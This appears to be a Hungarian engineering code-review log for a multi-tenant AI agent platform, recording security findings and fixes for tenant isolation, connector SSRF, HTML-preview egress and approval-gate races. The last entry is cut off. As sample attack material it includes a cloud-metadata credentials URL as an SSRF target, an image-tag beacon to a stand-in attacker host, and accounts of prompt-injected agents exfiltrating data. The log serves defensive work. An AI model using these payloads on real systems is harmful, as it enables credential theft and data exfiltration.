# Enterprise code review log

## 2026-08-05 - Audit control plane: cross-tenant audit-idővonal és SIEM-export lezárása

- Áttekintett, korábban külön nem naplózott komponens: a központi **Audit & Observability control plane** teljes olvasási/export útja — `app/src/app/actions/platform.ts` (`listAuditLog`, `exportAuditSiem`), `app/src/domain/audit/audit-chain-service.ts`, `app/src/repositories/postgres/audit-repository.ts`, az `AuditRepository` szerződés, hash-lánc és SIEM regressziós tesztek. Ez a compliance-bizonyíték, esemény-idővonal és külső SIEM-integráció közös adatkapuja.
- **Lelet (kritikus, cross-tenant adatbizalmasság):** a `listAuditLog` csak az `approver` tenant-szerepet ellenőrizte, de a repository-hívásból kimaradt az aktív `tenantId`. Emiatt bármely tenant approvere lekérhette az összes szervezet audit-eseményét: agent-azonosítókat, ticket/conversation referenciákat, governance-döntéseket, időbélyegeket és biztonsági incidensre utaló metaadatot. A `exportAuditSiem` ugyanezzel a hibával, `admin` szereppel **az egész globális audit-láncot** töltötte le JSONL-ben. Ez közvetlenül sértette az AuditLog spec tenant-izolációs invariánsát („minden lekérdezés tenant-scope-olt”), és egy ügyfél számára más ügyfelek működési/compliance-adatának exportját tette lehetővé.
- Javítás:
  - `listAuditLog` az `requireTenantRole` által visszaadott `activeTenantId`-t kötelező repository-szűrőként adja át.
  - A SIEM-export API-ja tenant-kötelezővé vált; a Postgres lekérdezés a DB-ben szűr `tenant_id` és opcionális `since` alapján, nem a memóriába töltött globális adathalmazon. A dátum is validált.
  - Az exportált evidenciasor megkapja a `tenant_id`, `ticket_id` és `conversation_id` mezőket, így a jogszerűen exportált adat továbbra is összeköthető a megfelelő üzleti folyamattal.
  - Regressziós teszt rögzíti a kötelező tenant-filtert, a másik tenant kizárását és a control-plane actionök tényleges bekötését.
- Üzleti hatás: audit-jogosultságnak csak a saját szervezet AI-működésének ellenőrzését kell jelentenie. A hiba mellett egy ügyfél jóváhagyója vagy adminja más ügyfelek modell-/tool-használatáról és jóváhagyási döntéseiről tölthetett le bizonyítékot, ami multi-tenant SaaS-ben súlyos szerződéses és compliance-incidens. A javítás után az audit UI és a SIEM-csomag is az aktív szervezet adatára korlátozott, miközben az export megőrzi a szükséges bizonyítási kapcsolatokat.
- Ellenőrzés: `npm run test:audit-log` — 30/30 zöld; célzott ESLint zöld; `git diff --cached --check` tiszta. A teljes `npx tsc --noEmit` a már jelen lévő, nem ehhez a változathoz tartozó model-budget WIP két hiányzó segédfüggvénye (`isRuleExhausted`, `pickPeakAgent`) miatt bukik; az audit-módosításokon túl nem nyúltam hozzá.

## 2026-08-04 - Generikus HTTP connector futásidő: agent-elérhető SSRF a redirect-követésen keresztül (host-pinning kijátszása)

- Áttekintett modul (a napló eddig a `web_fetch` SSRF-határát fedte 2026-07-04-én, és a `http_api` connectort a `reconcile_records` párosítás felől 2026-07-31-én — de a **generikus HTTP connector futásidő-egressét (`fetchWithBackoff`)** nem; ez a `http_api_get` / `http_api_request` eszközök mögötti tényleges kimenő-hálózati út, amit AGENT hív, path/query az agent kezében):
  - `app/src/domain/connector/http-api-client.ts` (`HttpApiClient.fetchWithBackoff` — a connector tényleges `fetch`-hívása, backoff + redirect-kezelés)
  - háttér: `app/src/domain/net/egress-guard.ts` (közös SSRF/allowlist őr), `app/src/domain/web-fetch/web-fetch-service.ts` (a helyes, azonos-host redirect-minta), a többi fogyasztó (`channel-outbound-transport.ts`, `connector-self-update/spec-sync.ts`, `platform-settings-service.ts`) redirect-kezelése összevetve.
- Eredmény — ami RENDBEN van (ellenőrizve): a **host nem átírható a path-ból** (abszolút URL / `..` / `//host` elutasítva `invalid_path`-tal, a host a config `baseUrl`-ből fix — 2026-07-31 lelet zárva); a titok SOSEM kerül promptba/argba/logba/hibába; a **pin-elt (önfrissítő) connector** hívásidőben újra egress-őrzött (DNS-feloldással) és MINDEN 3xx-et tilt; az oauth2 refresh-token/client_secret sosem szivárog; a méret-/lapozás-kapuk rendben.
- **Lelet (magas, SSRF — agent-elérhető, cloud-metadata / belső háló):** a `fetchWithBackoff` a `redirect: 'manual'`-t és a runtime egress-őrt **KIZÁRÓLAG `selfUpdatingPinned` connectornál** alkalmazta. A normál (admin-konfigurált, többségi) connectoroknál a `fetch` az **alapértelmezett `redirect: 'follow'`-val** futott, ÚJRA-ELLENŐRZÉS NÉLKÜL. Így egy allowlistolt host **egyetlen 3xx-szel** kivihette a hívást a connector konfigurált hostjáról egy tetszőleges célra — pl. `https://169.254.169.254/latest/meta-data/iam/security-credentials/` (felhő-metadata) vagy egy belső-only szolgáltatásra —, és a válasz (metadata IAM-token / belső adat) visszakerült a modellhez. A path és query az AGENT kezében van, így a vektor egy megbízható host **nyílt-redirect** végpontján keresztül is kiváltható (nem kell a felső szolgáltatásnak rosszindulatúnak lennie). Ez megtöri a connector host-pinning invariánsát („a hívás mindig a konfigurált hostra megy"), és az `web_fetch` már 2026-07-04 óta helyesen kezeli ugyanezt — a connector-út némán elsodródott tőle (v.ö. #194 „a két út észrevétlenül eltér" osztály).
- Javítás (`http-api-client.ts`):
  - **`redirect: 'manual'` MINDEN connectorra**, és a redirecteket kézzel, a connector SAJÁT **ORIGIN**-jére (séma+host+port) pinnelve követjük (új `fetchFollowingSameOriginRedirects`): más originre mutató átirányítás → `egress_blocked` (SSRF-blokk), azonos-origin redirect legfeljebb `MAX_SAME_HOST_REDIRECTS` (=3) ugrásig követhető, a Location nélküli 3xx és minden nem-3xx válasz változatlanul a modellhez kerül. A **pin-elt connector szigorúbb viselkedése változatlan** (minden 3xx tilt).
  - A same-origin-only szabály tudatos: a connector-kliens szándékosan NEM ismeri a tágabb tenant-egress-allowlistet (csak a saját `baseUrl`-jét), ezért a self-contained, biztonságos alapértelmezés a same-origin — pontosan ahogy a `web_fetch` is teszi.
  - **Origin-szintű (nem csak hostname) kötés** — a `/code-review` Spec-tengelye fogta meg: a puszta `hostname`-egyezés átengedett volna egy azonos-hostnevű, de MÁS PORTRA (pl. `:2375` belső admin/docker) mutató vagy `https→http` downgrade átirányítást. A `target.origin !== connectorOrigin` ezt is zárja.
  - **4 determinisztikus teszt** (`scripts/http-api-connector.test.ts`, befecskendezett `fetch`): (a) idegen host (metadata) redirect → `egress_blocked`, és a metadata hostra SOHA nem megy ki kérés; (b) azonos-origin redirect → követve, a 200-at adja vissza; (c) azonos hostnév más portra → `egress_blocked`; (d) azonos-origin redirect-hurok a hop-limitnél → blokk.
- Üzleti hatás: a HTTP connector arra való, hogy az agent egy admin által jóváhagyott külső API-t hívjon — és CSAK azt. E hiba mellett bármely tenant, amelynek van egy normál HTTP connectora, egy manipulált (prompt-injektált) agenttel a felhő instance-metadata IAM-hitelesítőit vagy belső-only szolgáltatásait olvastathatta ki egy átirányításon keresztül — ez teljes felhő-kompromittálódási út egy multi-tenant platformon. A javítás után a connector-hívás a redirect-láncon is a konfigurált hostra kötött; a legitim azonos-host átirányítás (pl. `/x` → `/x/`) továbbra is működik.
- Ellenőrzés: `npm run test:http-api` — minden zöld (incl. a 3 új SSRF/redirect eset); `npm run test:http-api-paginate` — zöld; `npx tsc --noEmit` — nincs hiba; `eslint` az érintett fájlokra zöld. (A CI a `ci-main-red-baseline` szerint billing miatt lépések nélkül bukik — lokálisan verifikálva.)
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) `channel-outbound-transport.ts` redirect (alacsony, defense-in-depth):** a Telegram kimenő adapter is `redirect: 'follow'`-val fut. A cél-host FIX (`api.telegram.org`, nem agent-vezérelt) és a Telegram Bot API nem irányít át, ezért a kockázat alacsony; de a konzisztens `redirect: 'manual'` itt is helyénvaló hardening lenne.
  - **(2) Nem-pin-elt connector `http://` baseUrl + DNS-rebinding a KEZDŐ kérésen (alacsony/megfigyelés):** a normál connector kezdő kérése — a pin-elttel ellentétben — nem fut át a teljes `guardEgressUrl`-en (nincs `https`-kényszer, nincs feloldás-utáni privát-IP re-check). Ez tudatos tervezési engedmény (az admin szándékosan konfigurálhat belső hostot), ezért nem szűkítettem — de ha az enterprise-posture a connectorokra is deny-by-default privát-IP-t kíván, azt külön policy-szeletként, a tenant-egress-allowlist bekötésével kell megtenni. Ugyanez a nem-garancia öröklődik az azonos-origin redirect-követésre is (a same-origin cél újra-feloldását nem re-checkeljük privát-IP-re) — tudatosan scope-on kívül.
  - **(3) Azonos-origin 302/303 → a metódus+body változatlanul újraküldve (alacsony, a `/code-review` Spec-tengelye jelezte):** a kézi követés az eredeti `init`-tel megy tovább (nincs 302/303→GET konverzió). A cél azonos origin, az auth-újraküldés így biztonságos, és az idempotencia-kulcs fejléc mérsékli az ismételt írást; a spec-korrekt metódus-váltást tudatosan nem implementáltam (marginális haszon, azonos-origin eset).
- A `/code-review` skill kimenete (két tengely, párhuzamos al-ágensek): **Standards** — nincs hard violation; magyar kommentek + üzleti keretezés megvan, a fájl-konvenciókhoz illik; két alacsony baseline-megfigyelés (enyhe Duplicated-Code a `web_fetch` mintájával — tudatos, mert a connector nem osztja a tág allowlistet; enyhe Primitive-Obsession a `connectorOrigin: string`-en — 1 hívási hely, nem éri meg típus). **Spec** — minden spec-pont megvalósítva; a hostname-vs-origin rést (fent bedolgozva) és a 302/303 metódus-replay reziduumot fogta meg, egyéb cross-origin/privát-IP szökési utat nem talált.

## 2026-08-03 - Workspace inline HTML-előnézet: külső egress (kép-beacon) zárása a nem-megbízható HTML kiszolgálásán

- Áttekintett modulok (a friss „user-facing fájlok + izolált HTML-megnyitás" komponens-család — a napló eddig a workspace fájl tenant-határát fedte (2026-07-11), de a most bevezetett **inline HTML-kiszolgálást** és a láthatósági/audience-modellt nem; a `/code-review` skill két tengelyével, Standards + Spec párhuzamos al-ágensekkel):
  - `app/src/app/api/v1/conversations/[id]/workspace/files/route.ts` és `app/src/app/api/v1/tickets/[id]/workspace/files/route.ts` (a `?disposition=inline` HTML-kiszolgálás + a rá tett biztonsági fejlécek — mindkettő committed, élő végpont)
  - `app/src/lib/workspace-file-visibility.ts` (audience-modell, `isWorkspaceFileUserFacing`, `workspaceHtmlPreviewFromLink`, linkesítés), `app/src/domain/file-editor/workspace-storage.ts` (`streamToClient`, `getSignedDownloadUrl`, `setFileAudience`, path-traversal őr), `app/src/components/workspace/html-preview-modal.tsx` (előnézeti iframe — jelenleg még commitolatlan WIP)
- Eredmény — ami RENDBEN van (ellenőrizve): a **path-traversal zárt** — a lemez-stub explicit `startsWith(rootPrefix)` őrrel (`stubAbsolutePath`), a GCS pedig `encodeURIComponent`-elt LITERÁL kulccsal tenant/ticket prefix alatt (a `..` a GCS-ben nem könyvtár-lépés); az **inline csak `.html`-re** engedett (`isHtmlWorkspaceFile`), a `write` mindig `application/octet-stream`-et tárol, a **letöltés attachment** dispozícióval megy; a `sandbox` CSP (token nélkül) tiltja a **scriptet és a same-origin** hozzáférést → az inline HTML nem éri el a platform sütijeit/API-ját; az audience-marker base64url-neve nem tartalmaz `/`-t (nincs marker-injektálás), a task-runtime agent-írása alapból `internal` (rejtett).
- **Lelet (közepes, kiszivárgás — külső egress a nem-megbízható HTML-ből):** a workspace HTML NEM megbízható (agent írhatta — akár egy külső dokumentumból származó prompt-injektálás hatására —, vagy a felhasználó töltötte fel), mégis ugyanarról az originről, `disposition=inline`-ként jelenik meg. A CSP `sandbox` tiltotta a scriptet, de a policy `img-src data: **https:**`-t engedett. A `sandbox` NEM zárja a képbetöltést — azt az `img-src` szabályozza —, így egy injektált HTML `<img src="https://tamado/gyujto?...">`-szel (vagy CSS `background:url(https://…)`-szel) **külső hostra indíthatott kérést, amint egy ember megnyitja az előnézetet**: ez beacon (a megnyitás ténye + IP/időpont) és korlátozott exfiltráció (a szerző által az URL-be kódolt adat) csatorna. A script tiltása ezt önmagában nem fedi. Ugyanaz a policy két külön route-ban **beégetett literálként duplikálódott** — a „egyik belépő némán széttart" osztály kockázata (v.ö. #112 middleware-lista, #126 tenant-bélyeg).
- Javítás:
  - **Közös, tesztelt helper (`app/src/lib/workspace-inline-html-headers.ts`):** `img-src data:` — kizárólag beágyazott (self-contained) kép; SEMMILYEN direktíva nem nyit külső `http(s)` forrást. A `sandbox` / `default-src 'none'` / `style-src 'unsafe-inline'` / `nosniff` / `no-referrer` egy helyen. Mindkét route erről kapja a fejléceket → a két belépő nem tud széttartani.
  - **Invariáns-teszt (`scripts/workspace-inline-html-headers.test.ts`) + CI-bekötés:** rögzíti, hogy a policy-string nem enged http(s)/wildcard img-src-et, és **wiring-lock**-ként (statikus forrás-ellenőrzés) hogy MINDKÉT route ténylegesen a helpert hívja és nem hoz vissza beégetett külső-egress CSP-t. A korábban CI-be NEM kötött `test:workspace-file-visibility` sibling is bekötve.
- Kód-review (a `/code-review` két tengelye a PR-en): **Standards** — nincs hard violation; a refaktor pont a korábbi Duplicated-Code / Divergent-Change kockázatot szünteti meg, a magyar kommentek és üzleti keretezés megvan (a teszt-lokális `directive()` parser elfogadható a zero-framework runner-stílusban). **Spec** — a Spec-ág jelezte, hogy az első tesztem csak a *konstanst* zárta, a route-bekötést nem → bedolgoztam a wiring-lockot (finding (a) lezárva); a navigációs-kattintás reziduum és a `signed=1` GCS-bypass a nyitott pontok közé került (l. lentebb).
- Üzleti hatás: az izolált HTML-előnézet arra való, hogy egy operátor biztonságosan megnézhessen egy agent által készített riportot anélkül, hogy az kárt tehetne. E hiba mellett egy manipulált (prompt-injektált) agent olyan „riportot" gyárthatott, amely a megnyitás pillanatában némán jelez/adatot küld egy külső szervernek — a felhasználónak láthatatlanul. A javítás után a nem-megbízható előnézet valóban zárt: se script, se same-origin, se külső hálózati kérés; a legitim, önálló (data:-képes, inline-stílusos) riport továbbra is megjeleníthető.
- Ellenőrzés: `npm run test:workspace-inline-html-headers` — 8/8 zöld (incl. 2 wiring-lock); `npm run test:workspace-file-visibility` — zöld; `npx tsc --noEmit` — az érintett fájlokon nincs hiba; `eslint` az érintett fájlokra zöld; `git diff --check` tiszta. (A CI a memória `ci-main-red-baseline` szerint billing miatt lépések nélkül bukik — a bekötés a helyreálláskor él, lokálisan verifikálva.)
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) `signed=1` GCS aláírt URL — inline-renderelhető nem-megbízható HTML (közepes, megfigyelés):** a `getSignedDownloadUrl` GCS-ágon a `storage.googleapis.com` objektumot **CSP és `Content-Disposition` nélkül** szolgálja ki (a feltöltés `application/octet-stream`-et tárol, de dispozíció nincs a válaszon). Cross-origin (nincs platform-session), és a fában lévő UI csak attachment-letöltésre használja (nincs `disposition=inline`), ezért a same-origin invariáns nem sérül; de az aláírt URL böngészőbe illesztve teljes scripttel+egresszel renderelheti a HTML-t a GCS originen. Javasolt: a feltöltés/aláírt URL állítson `response-content-disposition=attachment`-et. A `workspace-storage.ts` jelenleg commitolatlan WIP-et is tartalmaz (audience-marker), ezért tudatosan külön szeletre hagyva (WIP-be nem nyúltam).
  - **(2) Navigációs-kattintás reziduum (alacsony):** a `sandbox` blokkolja a scriptet/formot/meta-refresht, de egy sima `<a href="https://…">`-re a felhasználó kattintása CSP-vel nem zárható (nincs rá kifejezhető direktíva). Nem auto-tüzelő (kattintás kell), a `no-referrer` a hivatkozót elrejti; a payload-URL viszont nem. Elfogadott reziduum.
  - **(3) HTML-előnézeti iframe defense-in-depth (alacsony, WIP):** a `html-preview-modal.tsx` `<iframe>`-je (még commitolatlan) a szerver-CSP-re bízza az izolációt, saját `sandbox` attribútum nélkül. Amikor a WIP éleződik, adjunk hozzá `sandbox`-ot (allow-scripts/allow-same-origin nélkül), hogy a szülő-DOM is kikényszerítse a script-tiltást, ha a válasz-fejléc valaha lecserélődne (cache/proxy).
  - **(4) Audience-fallback (alacsony, UX/within-tenant):** marker nélküli agent-írás a `!isInternalWorkspaceFile` fallbackra esik, így egy nem-hivatkozott belső munkafájl user-facingként jelenhet meg (tenant-en belül, nem cross-tenant leak). A file-handler alapból ne user-audience-t adjon.

## 2026-08-01 - Következmény-kapu (consequence gate) jóváhagyás: egyszer-használat az „Újrapróbálom" (retry) úton

- Áttekintett modulok (a #97 emberi-jóváhagyási kapu — a napló ezt a komponens-családot eddig NEM fedte külön; ez az a pont, ahol egy külső/nem-megbízható tartalom utáni veszélyes / kilépő eszközhívás (levélküldés, író HTTP, fájltörlés, PR-nyitás, sandbox-promóció, memória) emberi „Jóváhagyom" gombra vár, mielőtt lefutna):
  - `app/src/domain/tool-broker/consequence-approval-service.ts` (a `createFromBlocked` / `approve` / `reject` / `getApprovedContinuation` / `listOpenForConversation` életciklus)
  - `app/src/domain/tool-broker/consequence-gate-policy.ts` (risk-class kapu-döntés: `ALWAYS_CONSEQUENCE_GATED_TOOLS`, http_api write/danger/nem-allowlistelt)
  - `app/src/domain/tool-broker/tool-trust-registry.ts` (bizalmi osztály + mellékhatás-halmaz, fail-safe az ismeretlen toolra) és `tool-broker-authorizer.ts` (szerveroldali írásjog-kapu)
  - Hívói kontextusban: `app/src/domain/agent/chat-tool-loop.ts` (a kapu érvényesítése a chat úton), `app/src/app/actions/platform.ts` (approve/reject akciók), `app/src/app/api/v1/agent-chat/stream/route.ts` (jóváhagyás-folytatás), `app/src/repositories/postgres/consequence-approval-repository.ts` (CAS).
- Eredmény — ami RENDBEN van (ellenőrizve): a **tenant-határ fail-closed** (a döntés a beszélgetésre néz `findByIdForTenant`-tal, az idegen tenant a pending LÉTEZÉSÉT sem látja; defense-in-depth az agent-elérhetőség is); az **első jóváhagyás egyszer-használatos** (`pending → approved` CAS, a vesztő null-t kap); a **titok/kontextus nem szivárog** (a folytatás-prompt szerveroldali, a külső eredetű részletek `external_untrusted` borítékban mennek a modellhez); a risk-class kapu determinisztikus és **args-független, az agent nem befolyásolja** (SoD); az ismeretlen tool fail-safe kapura esik.
- **Lelet (közepes, integritás — dupla mellékhatás a retry úton):** az `approve()` „Újrapróbálom" ága — ahová egy elbukott (`denied`/exception) invoke után a `approved` sor esik — **semmilyen atomikus zárral nem volt védve** (`consequence-approval-service.ts` a régi 267-269. sor: közvetlen `invokeApproved(row, actor)`). Miközben az ELSŐ jóváhagyást a `pending → approved` CAS egyszer-használatossá teszi, a retryt nem védte semmi: két **párhuzamos** kattintás (dupla klikk, vagy több szerver-instancia) mindegyike belépett az ágba, mert a státusz végig `approved` maradt, és **KÉTSZER futtatta a mellékhatásos toolt** — két elküldött e-mail, dupla `POST`, kétszeri `file_delete`. A #97 alapígérete („egy jóváhagyás = egy végrehajtás") pont a retryn sérült.
- Javítás:
  - **`casClaimRetry` (atomi CAS-claim a retry úton):** egyetlen `UPDATE` ellenőrzi (`status='approved' AND result_meta @> {"denied":true} AND NOT jsonb_exists(result_meta,'retrying')`) és ráteszi a `retrying:true` jelzőt (a `denied`-et **merge-dzsel megtartva**). Két párhuzamos retry közül csak egy módosít sort; a vesztő `null`-t kap → `approval_retry_in_flight`, nem futtat. Séma-migráció NÉLKÜL (raw SQL `@>` containment + `jsonb_exists`, a repóban dokumentált bevált minta, l. `ticket-repository.ts`; `jsonb_exists` függvényforma, hogy a `?` operátor ne ütközzön a driver paraméter-helyőrzőjével).
  - **A `denied` szándékos megtartása + explicit `isRetryInFlightResultMeta` kapu az `approve()`-ban:** egy folyamatban lévő retry SOHA nem eshet a siker-ágba — enélkül (a Spec-review finding (c)-je) egy futó / soha-le-nem-futott toolt „lefutott"-ként jelentettünk volna. A `getApprovedContinuation` is elutasítja a folyamatban lévő retryt.
  - **Regressziós tesztek** a már CI-be kötött `consequence-approval.test.ts`-be (28/28 zöld): párhuzamos retry → pontosan egy győz, `invoked.length===2` (egy initial + egy retry, nem kettő); a folyamatban lévő retry-jelzős sor → `approve` nem futtat és nem jelent hamis sikert.
- Kód-review (a `/code-review` skill két tengelye, felülvizsgálat a PR-en): **Standards** — nincs dokumentált hard violation (magyar kommentek, üzleti/UX-keretezés, a Prisma JSON-path NULL-bug bevált `@>`-mintája követve); a review két judgement-call smellt jelzett (a `resultMeta` mint típustalan flag-zsák → `hasFlag` helper és `ResultMeta` unió lehetősége) — tudatosan külön, kockázatmentes refaktorra hagyva. **Spec** — a review két lyukat talált a saját első javításomban (a fals-siker a retry-jelzőre és a crash-stuck), mindkettőt bedolgoztam a merge előtt (denied megtartása + explicit kapu; fail-safe „folyamatban" állapot).
- Üzleti hatás: a következmény-kapu az a governance-kontroll, ami megakadályozza, hogy egy AI-ügynök prompt-injektálás vagy külső tartalom hatására magától küldjön ki e-mailt, írjon külső rendszerbe vagy töröljön — emberi jóváhagyáshoz köti. E hiba mellett egy jóváhagyott, de átmenetileg megbukott művelet ÚJRApróbálásakor a felhasználó dupla kattintása valós, visszafordíthatatlan DUPLIKÁCIÓT okozhatott (ügyfélnek kétszer kimenő levél, kétszeres külső írás). A javítás abszolúttá teszi az „egy jóváhagyás = legfeljebb egy végrehajtás" invariánst a retry úton is, és fail-safe módon áll le (sosem dupla, sosem hamis siker).
- Ellenőrzés: `npm run test:consequence-approval` — 28/28 zöld (2 új eset); `npx tsc --noEmit` — az érintett fájlokon nincs hiba (a fán megmaradó egyetlen hiba egy idegen, `systemRole`-t érintő teszt, a megosztott node_modules újragenerált Prisma-kliensétől — nem e PR része); `eslint` az érintett fájlokra zöld.
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) Crash-recovery sweep (közepes, rendelkezésre állás — megfigyelés):** a claim ÉS az első `pending→approved` CAS is beállítja a végállapot előtti köztes jelzőt; ha a process a végrehajtás közben áll le, a sor „folyamatban / végállapot nélkül" ragad (fail-safe: se dupla, se hamis siker, de a művelet nem folytatódik). Egy időbélyeg-alapú stale-újralefoglaló sweep MINDKÉT utat (initial + retry) rendezné — külön szelet, mert a stale-ablak rosszul megválasztva egy nagyon lassú tool esetén dupla-futás kockázatot vinne be.
  - **(2) `resultMeta` mint típustalan flag-zsák (Standards, kicsi):** a `denied`/`retrying`/`failed`/`reason`/`result` mezők szórt `as {…}` cast-okkal — egy közös `ResultMeta` diszkriminált unió + `hasFlag` helper megszüntetné a cast-sprawlt és szinkronban tartaná az SQL-literált az olvasókkal. Kockázatmentes, külön PR.
  - **(3) Következmény-kapu az autonóm (harness) úton (korábbi napló ismételt megfigyelése, változatlanul nyitva):** a risk-class kapu csak a chat-loopban fut; a `toolBroker.invoke` autonóm útján (ticket/process) az emberi jóváhagyás — természeténél fogva — nem értelmezhető, ott az írásjog-kapu véd. Policy-döntést igényel, szándékosan nem érintve.

## 2026-07-31 - Nagy listás tool-loop / HTTP API motor: `reconcile_records` párosítás-korrektség + méret-kapu

- Áttekintett modulok (a #179 keretében frissen bevezetett „nagy adathalmaz a munkaterületen, nem a kontextusban" komponens-család — a napló ezt eddig egyáltalán nem fedte; fókusz a `23249c79...HEAD` diffen, a `/code-review` skill két tengelyével, Standards + Spec párhuzamos al-ágensekkel):
  - `app/src/lib/reconcile-records.ts` + `app/src/domain/tool-broker/handlers/reconcile-records.handler.ts` (a determinisztikus két-listás egyeztetés — a WP-2 lelke)
  - `app/src/domain/connector/http-api-client.ts`, `http-api-paginate.ts`, `http-api-prompt.ts` (a generikus HTTP/REST connector-motor: `http_api_get` / `http_api_get_all` / `http_api_request`, lapozás, katalógus + hint)
  - `app/src/domain/agent/tool-result-extract.ts`, `context-compactor.ts`, a `chat-tool-loop.ts` livelock-fékei; kontextusban a `tool-broker-authorizer.ts` (írásjog-kapu) és `consequence-gate-policy.ts` (következmény-kapu).
- Eredmény — ami RENDBEN van (ellenőrizve): **nincs agent-vezérelt SSRF** — a `path` nem tartalmazhat sémát (`invalid_path`), és mivel a `baseUrl` teljes origin, a `//host`, `/@host`, backslash- és `..`-trükkök sem tudják átírni a hostot (empirikusan igazolva); az **írásjog szerveroldalon kötelező** — a `http_api_request` a broker-authorizerben `accessMode: 'write'` connector-linket követel (`missing_http_api_connector_write_*`), a chat-loop kapuja csak másodlagos réteg; a **titok sosem szivárog** (auth-header a Secret Store-ból injektálva, `Authorization` felülírása tiltott, oauth2 refresh-token/​client_secret sosem kerül hibába/logba); a **pinned (önfrissítő) connector** hívásidőben újra egress-őrzött, redirect tiltott; a lapozás korlátos (`maxPages ≤ 200`, `pageSize ≤ 500`); a livelock-fékek (per-forduló / per-archívum visszaolvasási keret, egyetlen könyvelési pont, thrash-guard) célzottak és rendben.
- **Lelet #1 (magas, integritás — néma adatvesztés a párosításban):** a `reconcileRecords` mohó, egy-menetes párosítása **sorrend-függő** volt: minden bal sor azonnal lefoglalta az első jelöltjét (`pick = full ?? candidates[0]`). Ha egy KORÁBBI bal sor egy jobb rekordot RÉSZLEGES (hiányos kulcsú) találatként elvitt, egy KÉSŐBBI bal sor VALÓDI, minden kulcson pontos párja már „foglalt"-ba ütközött, és **némán „Új rekord" (`matchStrength: 'none'`) lett — bizonytalan-jelzés nélkül.** Egy tulajdoni-lap egyeztetésnél ez azt jelenti, hogy egy ténylegesen egyező tulajdonos „új / törlendő" sorként jelenik meg az operátornak — pontosan az a néma hiba, amit a `Rendben / Módosítás / Új / Törlés` státuszmodellnek meg kellene előznie. A hiba az összesítésben láthatatlan.
- **Lelet #2 (magas, rendelkezésre állás — korlátlan O(n×m) a célfeladaton):** ugyanez a párosítás `bal × jobb` költségű, de a bemenetre **semmilyen felső korlát nem volt**. A tool épp a NAGY listákra készült (a `http_api_get_all` akár 100 000 elemet ad vissza), így két nagy munkaterületi JSON egyeztetése (pl. 10 000 × 10 000 = 100M összevetés, mindegyik regex-normalizálással) **percekre befagyasztja a Node eseményhurkot** — ezzel a közös példányon minden más agent-forduló és HTTP-kérés is elakad (CWE-1333-rokon rendelkezésre-állási rés). A spec elfogadási esete (Novaj: 182 × 249 ≈ 45k) rendben fut, de a határ védtelen volt.
- Javítás:
  - **Párosítás két menetben (Lelet #1):** 1. kör kizárólag a TELJES (full) egyezéseket osztja ki globálisan, 2. kör a maradék bal soroknak ad részleges párt — így egy későbbi pontos párt sosem visz el egy korábbi részleges találat. Amelyik bal sornak VOLT lehetséges párja, de versenyben elvesztette, az **`Ellenőrzés szükséges`** státuszt kap (nem „Új rekord" — az beszúrást sugallna), uncertain-ként a **ténylegesen lefoglalt** jobb sorra mutatva.
  - **Méret-kapu (Lelet #2):** `assertReconcileSizeWithinLimit` — oldalankénti (`MAX_RECONCILE_ROWS_PER_SIDE = 20 000`) és pár-szorzat (`MAX_RECONCILE_PAIRS = 4 000 000`) plafon, a hurok ELŐTT, **közérthető, actionable magyar hibával** (szűkítsd a kulcsot / darabold csoportokra) — a worker gyorsan, őszintén áll le, nem fagy be némán. A handler a nem-`FileEditorError` kivételt továbbadja, így az üzenet a modellhez ér.
  - Regressziós tesztek a már CI-be kötött `reconcile-records.test.ts`-be: sorrend-csapda (`Ellenőrzés szükséges` + full `Rendben`); contested `rightIndex` a lefoglalt jelöltre; túlméret fail-fast; Novaj 182×249 átmegy.
- Kód-review (két tengely, felülvizsgálat a PR-en): **Spec** (#179 WP-2) — a contested sor korábban uncertain mellett is `Új rekord` státuszt kapott (félrevezető státuszoszlop / `ujRekord` számláló); ez javítva. **Standards** — nincs hard violation; a contested `candidates[li][0]` arbitrált pointer javítva (`pickContestedCandidate` — ha nincs lefoglalt jelölt, `undefined`, nem spekulatív `candidates[0]`). Handler: workspace JSON olvasás `readTextFileOrNull`-lal (a `readFile` sortáblázott kimenete nem érvényes JSON).
- Üzleti hatás: a `reconcile_records` a platform „megbízható, gépi egyeztetés" ígérete — pont azért van, hogy a determinisztikus párosítást ne a modell találgassa, hanem kód végezze hibátlanul. Lelet #1 mellett az eredmény csendben hibás lehetett (egyező felet „új/törlendő"-ként mutatva), ami egy földhivatali vagy pénzügyi egyeztetésnél téves emberi döntéshez vezet; Lelet #2 mellett egy jóhiszemű, nagy egyeztetés az egész feldolgozó példányt megbéníthatta. A javítás visszaadja a determinisztikus párosítás megbízhatóságát ÉS megvédi a worker rendelkezésre állását.
- Ellenőrzés: `npm run test:reconcile-records` — 9/9 zöld; `npx tsc --noEmit` — a `reconcile` érintett fájlokon nincs hiba.
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) `tool_result_extract` beágyazott mező null vs undefined (kis, integritás):** a lapos hiányzó mező `null`, a beágyazott (`a.b`) hiányzó `undefined` — utóbbit a `JSON.stringify` kihagyja, így az oszlop-jelenlét soronként ingadozhat, és egy rá kulcsoló downstream `reconcile`/`xlsx` elcsúszhat. Kicsi, de valós — külön fix.
  - **(2) Karbantartó smell-ek (Standards):** közös `record-array` util a `paginate` ↔ `extract` duplikáció (`valueAtPath`, `COMMON_ARRAY_KEYS` négy példány) megszüntetésére; `http-api.handler` tool-név ismétlés a `HTTP_TOOLS` Set-ből. Kockázatmentes, de külön PR.
  - **(3) Következmény-kapu az autonóm (harness) úton (közepes, governance — megfigyelés):** a `http_api_request` write/danger következmény-kapuja (emberi jóváhagyás) csak a chat-loopban fut; a `toolBroker.invoke` autonóm útján (ticket/process → `/api/v1/agent/tools`) a `gmail_send` mintájával ellentétben nincs analóg kapu. Az írásjog-kapu ott is véd (csak írás-jogú connector futtathat írást), de a „veszélyes külső írás emberi jóváhagyást kér" invariáns az autonóm úton nem érvényesül. Külön policy-döntést és szeletet igényel — itt szándékosan nem nyúltam hozzá (viselkedés-változtatás kockázata).

## 2026-07-30 - Skill-katalógus: skill→agent kötés cross-tenant agent-célzása

- Áttekintett modulok (az importálható/desztillálható „skill" katalógus — puha instrukció + kemény capability-igény —, amelyet aktiváláskor egy agent futásidejű promptjába injektálunk; a napló eddig a skill-spec tenant-*olvasási* határát nem, és az agent-célzó *írási* utakat egyáltalán nem fedte):
  - `app/src/domain/skill/skill-service.ts` (`assign`, `unassign`, `setEnabled`, `listAgentSkillsWithReadiness` — az agenthez kötő/olvasó felület)
